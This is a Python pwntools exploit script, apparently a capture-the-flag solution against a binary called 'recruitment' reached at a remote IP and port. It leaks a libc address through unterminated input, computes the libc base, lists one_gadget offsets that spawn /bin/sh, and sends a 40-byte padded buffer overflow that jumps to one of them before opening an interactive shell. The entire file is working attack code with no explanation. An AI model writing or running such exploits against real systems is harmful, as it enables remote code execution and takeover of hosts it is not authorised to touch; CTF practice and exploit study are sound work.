from pwn import *

LOCAL = False
REMOTE = True
GDB = True

if REMOTE:
	LOCAL = False
	GDB = False

# Cant have GDB and non local
if(GDB == True and LOCAL == False):
	LOCAL = True

local_bin = "./recruitment"

if REMOTE: 
	p = remote('83.136.250.185',46398)
if LOCAL:
	p = process(local_bin)
if GDB:
	context.log_level = 'debug'
	gdb.attach(p.pid,''' 
	breakrva 0x2a7a
	breakrva 0x277c
	c
	''')

p.sendlineafter(b"$ ",b"1")
p.sendlineafter(b": ",b"AAAA")
p.sendlineafter(b": ",b"BBBB")
p.sendafter(b": ",b"C" * 24)

p.recvuntil(b"C" * 24)
leak = p.recvuntil(b"\n").split(b"\n")[0]

if(len(leak) != 6):
 	log.error("Try again there is null byte inside library address space")

libc_leak = u64(leak.ljust(8, b"\x00"))

log.info("libc leak " + hex(libc_leak))

libc = libc_leak - 0x93bca

log.info("libc " + hex(libc))

# 0x583dc posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x68 is writable
#   rsp & 0xf == 0
#   rax == NULL || {"sh", rax, rip+0x17302e, r12, ...} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0x583e3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x68 is writable
#   rsp & 0xf == 0
#   rcx == NULL || {rcx, rax, rip+0x17302e, r12, ...} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0xef4ce execve("/bin/sh", rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp

# 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
# constraints:
#   address rbp-0x50 is writable
#   rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
#   [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp

p.sendlineafter(b"$ ",b"3")

one_gadget = libc + 0x583e3

padding = b"A" * 40
payload = padding + p64(one_gadget)
p.sendlineafter(b": ",payload)

p.interactive()

